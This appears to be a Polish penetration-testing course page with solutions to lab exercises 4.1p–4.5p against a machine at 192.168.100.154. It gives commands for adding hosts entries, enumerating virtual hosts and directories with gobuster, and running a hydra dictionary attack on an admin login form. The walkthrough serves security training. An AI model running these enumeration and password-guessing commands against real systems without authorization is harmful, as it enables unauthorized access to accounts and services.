---
title: cw04_p.md
description: Zadania PENTEST
order: 2
---

## 4.1p - Nazwa z certyfikatu

> **Uwaga do rozwiązania:** Wartości `developer` i `192.168.100.154` pochodzą z repozytorium. Odczytaj nazwę z certyfikatu swojej maszyny przed dodaniem wpisu do hosts.

```bash
#Open https://192.168.100.154/ in browser and check 'View Certificate' -> 'Common Name' (developer)
echo '192.168.100.154 developer' | sudo tee -a /etc/hosts
#Open https://developer/ in browser
```

## 4.2p - Odkrycie subdomeny

```bash
gobuster vhost -u https://developer/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain developer --append-domain -k
#Found beta.developer
echo '192.168.100.154 beta.developer' | sudo tee -a /etc/hosts
#Open https://beta.developer/ in browser
```

## 4.3p - Katalog administratora

```bash
gobuster dir -u https://beta.developer/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -k
#Open https://beta.developer/admin/ in browser
```

## 4.4p - Plik panelu logowania

```bash
gobuster dir -u https://beta.developer/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -k
```

## 4.5p - Słownikowy test hasła

```bash
hydra -l anything -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt 'https-post-form://beta.developer/admin/index_admin.php:p=^PASS^:Wrong password'
```
